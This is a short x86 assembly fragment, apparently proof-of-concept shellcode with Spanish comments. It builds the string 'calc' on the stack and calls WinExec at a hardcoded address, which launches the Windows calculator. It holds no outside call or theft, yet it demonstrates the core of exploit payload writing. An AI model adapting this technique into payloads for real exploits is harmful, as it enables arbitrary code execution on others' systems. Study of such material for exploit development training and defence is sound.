
	section	.text

_payload:
	xor	eax,eax
	push	eax		; null byte && uCmdShow
	mov	ebx,0x636c6163	; 'calc'...
	push	ebx		; ..a la pila
	mov	ebx,esp		; ptr a 'calc' en la pila
	push	ebx	   	; lpCmdLine = PTR 'calc.exe'
	call	0x7c8623ad	; call ptr to  WinExec (check with arwin.exe)
